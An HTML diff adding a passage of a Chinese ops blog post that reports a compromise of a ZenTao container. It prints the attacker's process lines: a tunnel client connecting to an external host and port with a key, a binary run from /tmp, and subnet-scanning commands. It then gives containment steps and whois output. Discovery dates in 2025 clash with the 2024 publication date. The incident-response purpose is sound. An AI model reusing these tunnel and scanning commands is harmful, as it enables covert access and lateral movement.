@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next-haha.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next-haha.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next-haha.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ming.theyan.gs","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="发现时间最早发现是 2025-05-06 下午，发现 PVE 的香港出口带宽异常，接着发现跟 176.32.35.190 的 tcp 端口 8024 有大量的数据交互 然后在 2025-05-07 上午，用 docker exec -it zentao &#x2F;bin&#x2F;bash 进入容器，apt install psmisc，然后 pstree -a 才确认被入侵的。 zentao 容器内执行 pstr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="禅道（zentao）被入侵的相关信息">
+<meta property="og:url" content="https://ming.theyan.gs/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:site_name" content="运维烂笔头">
+<meta property="og:description" content="发现时间最早发现是 2025-05-06 下午，发现 PVE 的香港出口带宽异常，接着发现跟 176.32.35.190 的 tcp 端口 8024 有大量的数据交互 然后在 2025-05-07 上午，用 docker exec -it zentao &#x2F;bin&#x2F;bash 进入容器，apt install psmisc，然后 pstree -a 才确认被入侵的。 zentao 容器内执行 pstr">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-13T10:28:45.000Z">
+<meta property="article:modified_time" content="2024-10-21T11:51:22.000Z">
+<meta property="article:author" content="老杨">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="zentao">
+<meta property="article:tag" content="adminer">
+<meta property="article:tag" content="phpx2lUxr">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://ming.theyan.gs/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ming.theyan.gs/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html","path":"2024/10/禅道（zentao）被入侵报告/index.html","title":"禅道（zentao）被入侵的相关信息"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>禅道（zentao）被入侵的相关信息 | 运维烂笔头</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106574959-2"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-106574959-2","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="/js/third-party/analytics/google-analytics.js" defer></script>
+
+  <script src="/js/third-party/analytics/baidu-analytics.js" defer></script>
+  <script async src="https://hm.baidu.com/hm.js?fdef9ded31bdb8b2dab08eddebdd5fed"></script>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+<!-- google adsense -->
+<script data-ad-client="ca-pub-1045025618858716" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="运维烂笔头" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">运维烂笔头</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个 SA 老兵的工作日志</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-projects"><a href="/projects" rel="section"><i class="fa fa-code fa-fw"></i>projects</a></li><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E6%97%B6%E9%97%B4"><span class="nav-number">1.</span> <span class="nav-text">发现时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">应急处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">继续分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">3.1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E7%96%91%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">可疑文件分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%A7%E7%BB%AD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">继续漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E6%93%8D%E4%BD%9C"><span class="nav-number">4.</span> <span class="nav-text">后续操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">异常文件分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="nav-number">4.2.</span> <span class="nav-text">攻击者基础设施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="nav-number">4.3.</span> <span class="nav-text">入侵时间线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="nav-number">4.4.</span> <span class="nav-text">可能攻击向量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E4%BB%B6%E5%BD%B1%E5%93%8D"><span class="nav-number">5.</span> <span class="nav-text">事件影响</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-number">6.</span> <span class="nav-text">结论</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">老杨</p>
+  <div class="site-description" itemprop="description">好记性比不过烂笔头</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">508</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/haw-haw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;haw-haw" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@theyan.gs" title="E-Mail → mailto:blog@theyan.gs" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/1494877243" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;1494877243" rel="noopener me" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/6fool" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;6fool" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://bad-pencil.github.io/" title="https:&#x2F;&#x2F;bad-pencil.github.io" rel="noopener" target="_blank">github 镜像站</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://hawhaw.gitee.io/" title="https:&#x2F;&#x2F;hawhaw.gitee.io" rel="noopener" target="_blank">gitee 镜像站</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="禅道（zentao）被入侵的相关信息 | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          禅道（zentao）被入侵的相关信息
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-13 18:28:45" itemprop="dateCreated datePublished" datetime="2024-10-13T18:28:45+08:00">2024-10-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-21 19:51:22" itemprop="dateModified" datetime="2024-10-21T19:51:22+08:00">2024-10-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="发现时间"><a href="#发现时间" class="headerlink" title="发现时间"></a>发现时间</h2><p>最早发现是 2025-05-06 下午，发现 PVE 的香港出口带宽异常，接着发现跟 176.32.35.190 的 tcp 端口 8024 有大量的数据交互</p>
+<p>然后在 2025-05-07 上午，用 <code>docker exec -it zentao /bin/bash</code> 进入容器，<code>apt install psmisc</code>，然后 <code>pstree -a</code> 才确认被入侵的。</p>
+<p>zentao 容器内执行 <code>pstree -a</code> 输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">s6-svscan /etc/s6/s6-enable</span><br><span class="line">  |-s6-supervise 00-mysql</span><br><span class="line">  |   `-mysqld_safe /opt/zbox/run/mysql/mysqld_safe ...</span><br><span class="line">  |       `-mariadbd --defaults-file=/data/mysql/etc/my.cnf--basedir=/opt/zbox/run</span><br><span class="line">  |           `-13*[&#123;mariadbd&#125;]</span><br><span class="line">  |-s6-supervise 02-sentry</span><br><span class="line">  |   `-tail -f /tmp/sentry.log</span><br><span class="line">  |-s6-supervise 03-roadrunner</span><br><span class="line">  |   `-rr serve -c /apps/zentao/roadrunner/.rr.yaml</span><br><span class="line">  |       `-5*[&#123;rr&#125;]</span><br><span class="line">  |-s6-supervise 01-apache</span><br><span class="line">  |   `-apachectl /opt/zbox/bin/apachectl -D FOREGROUND</span><br><span class="line">  |       `-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |   `-sh -c ...</span><br><span class="line">  |           |       `-sh -c cd /tmp;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2</span><br><span class="line">  |           |           `-slix</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |   `-scanb.sh ./scanb.sh</span><br><span class="line">  |           |               |       `-fs -h 192.168.38.0/24 -o 192b.txt -t 5 -np ...</span><br><span class="line">  |           |               |           `-8*[&#123;fs&#125;]</span><br><span class="line">  |           |               `-4*[&#123;slix&#125;]</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |   `-sh -c...</span><br><span class="line">  |           |       `-sh -c...</span><br><span class="line">  |           |           `-ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc ...</span><br><span class="line">  |           |               `-11*[&#123;ns&#125;]</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           `-httpd -D FOREGROUND</span><br><span class="line">  `-scanb.sh ./scanb.sh</span><br><span class="line">      `-fs -h 192.168.39.0/24 -o 192b.txt -t 5 -np</span><br><span class="line">          `-8*[&#123;fs&#125;]</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>对比一下正常的 <code>pstree -a</code> 的结果吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s6-svscan /etc/s6/s6-enable</span><br><span class="line">  |-s6-supervise 00-mysql</span><br><span class="line">  |   `-mysqld_safe /opt/zbox/run/mysql/mysqld_safe ...</span><br><span class="line">  |       `-mariadbd --defaults-file=/data/mysql/etc/my.cnf--basedir=/opt/zbox/run</span><br><span class="line">  |           `-7*[&#123;mariadbd&#125;]</span><br><span class="line">  |-s6-supervise 02-sentry</span><br><span class="line">  |   `-run ./run</span><br><span class="line">  |       `-sleep 4</span><br><span class="line">  |-s6-supervise 03-roadrunner</span><br><span class="line">  |   `-run ./run</span><br><span class="line">  |       `-sleep 1</span><br><span class="line">  `-s6-supervise 01-apache</span><br><span class="line">      `-apachectl /opt/zbox/bin/apachectl -D FOREGROUND</span><br><span class="line">          `-httpd -D FOREGROUND</span><br><span class="line">              |-httpd -D FOREGROUND</span><br><span class="line">              |-httpd -D FOREGROUND</span><br><span class="line">              |-httpd -D FOREGROUND</span><br><span class="line">              |-httpd -D FOREGROUND</span><br><span class="line">              `-httpd -D FOREGROUND</span><br></pre></td></tr></table></figure>
+
+<p>完了，确认被黑了。</p>
+<p>zentao 容器内执行 <code>ps auxww | grep ns</code> 发现输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nobody   3084676  0.0  0.0   2480   516 ?        S    Apr23   0:00 sh -c /bin/sh -c &quot;cd &quot;/bin&quot;;/tmp/.1/ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc -type=tcp;echo dc721;pwd;echo 291d6457e&quot; 2&gt;&amp;1</span><br><span class="line">nobody   3084677  0.0  0.0   2480   524 ?        S    Apr23   0:00 /bin/sh -c cd /bin;/tmp/.1/ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc -type=tcp;echo dc721;pwd;echo 291d6457e</span><br><span class="line">nobody   3084678  0.1  0.3 858416 55708 ?        Sl   Apr23  37:05 /tmp/.1/ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc -type=tcp</span><br><span class="line">root     3098254  0.0  0.0   3240   648 pts/0    S+   13:20   0:00 grep ns</span><br></pre></td></tr></table></figure>
+
+<p>zentao 容器内执行 <code>ps auxww | grep slix</code> 输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nobody    975792  0.0  0.0   2480   540 ?        S    Apr17   0:00 sh -c /bin/sh -c &quot;cd &quot;/tmp&quot;;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2&quot; 2&gt;&amp;1</span><br><span class="line">nobody    975793  0.0  0.0   2480   544 ?        S    Apr17   0:00 /bin/sh -c cd /tmp;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2</span><br><span class="line">nobody    975794  0.0  0.0   5788  2936 ?        Sl   Apr17  23:43 ./slix</span><br><span class="line">root     3141372  0.0  0.0   3240   648 pts/0    S+   11:21   0:00 grep slix</span><br></pre></td></tr></table></figure>
+
+<h2 id="应急处理"><a href="#应急处理" class="headerlink" title="应急处理"></a>应急处理</h2><p>将被入侵容器 zentao 挪到 none 网络，然后将 zentao 容器改名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker network disconnect chainless zentao</span><br><span class="line">docker network connect none zentao</span><br><span class="line">docker rename zentao zentao_hacked</span><br></pre></td></tr></table></figure>
+
+<h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>zentao 容器：</p>
+<ul>
+<li>ip: 172.16.0.2</li>
+<li>image: easysoft&#x2F;zentao:21.4</li>
+<li>publish port: 8002</li>
+</ul>
+<p>zentao 容器宿主机：</p>
+<ul>
+<li>ip: 192.168.0.11 or 192.168.1.11</li>
+</ul>
+<p>宿主机是一台 vm，宿主机是一台有着公网地址的物理及：PVE</p>
+<ul>
+<li>ip: <ul>
+<li>a.a.a.a(香港线路接口 IP，缺省出口)</li>
+<li>b.b.b.b(中国移动接口 IP)</li>
+<li>192.168.0.1 和 192.168.1.1(内部网桥 ip，所有 vm 都是接在网桥上的)</li>
+</ul>
+</li>
+<li>nginx<ul>
+<li>做了个虚机 proxy_pass 到容器宿主机的 8002 端口，所以可以通过 PVE 的公网入口访问 zentao</li>
+</ul>
+</li>
+</ul>
+<p>whois 的信息（<code>whois 176.32.35.190</code> 的输出）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">% This is the RIPE Database query service.</span><br><span class="line">% The objects are in RPSL format.</span><br><span class="line">%</span><br><span class="line">% The RIPE Database is subject to Terms and Conditions.</span><br><span class="line">% See https://docs.db.ripe.net/terms-conditions.html</span><br><span class="line"></span><br><span class="line">% Note: this output has been filtered.</span><br><span class="line">%       To receive output for a database update, use the &quot;-B&quot; flag.</span><br><span class="line"></span><br><span class="line">% Information related to &#x27;176.32.35.0 - 176.32.35.255&#x27;</span><br><span class="line"></span><br><span class="line">% Abuse contact for &#x27;176.32.35.0 - 176.32.35.255&#x27; is &#x27;noc@baxet.ru&#x27;</span><br><span class="line"></span><br><span class="line">inetnum:        176.32.35.0 - 176.32.35.255</span><br><span class="line">netname:        BX-NETWORK</span><br><span class="line">country:        RU</span><br><span class="line">admin-c:        DS9183-RIPE</span><br><span class="line">tech-c:         DS9183-RIPE</span><br><span class="line">status:         ASSIGNED PA</span><br><span class="line">mnt-by:         BX-NOC</span><br><span class="line">created:        2017-12-13T12:29:22Z</span><br><span class="line">last-modified:  2017-12-13T12:29:22Z</span><br><span class="line">source:         RIPE # Filtered</span><br><span class="line"></span><br><span class="line">person:         Dmitry Shilyaev</span><br><span class="line">remarks:        https://justhost.ru</span><br><span class="line">address:        Moscow, Russia</span><br><span class="line">phone:          +74956680903</span><br><span class="line">nic-hdl:        DS9183-RIPE</span><br><span class="line">mnt-by:         BX-NOC</span><br><span class="line">created:        2011-11-03T08:14:05Z</span><br><span class="line">last-modified:  2020-07-26T15:49:06Z</span><br><span class="line">source:         RIPE # Filtered</span><br><span class="line"></span><br><span class="line">% Information related to &#x27;176.32.35.0/24AS51659&#x27;</span><br><span class="line"></span><br><span class="line">route:          176.32.35.0/24</span><br><span class="line">origin:         AS51659</span><br><span class="line">mnt-by:         BX-NOC</span><br><span class="line">created:        2017-12-13T12:30:03Z</span><br><span class="line">last-modified:  2017-12-13T12:30:03Z</span><br><span class="line">source:         RIPE</span><br><span class="line"></span><br><span class="line">% This query was served by the RIPE Database Query Service version 1.117 (BUSA)</span><br></pre></td></tr></table></figure>
+
+<p>容器宿主机上执行 <code>docker inspect zentao | grep -i privileged</code>，输出：</p>
+<blockquote>
+<pre><code>        &quot;Privileged&quot;: false,
+</code></pre>
+</blockquote>
+<p>zentao_hacked(容器 zentao 改名来的) 容器内执行 <code>ls -la /tmp</code> 输出：</p>
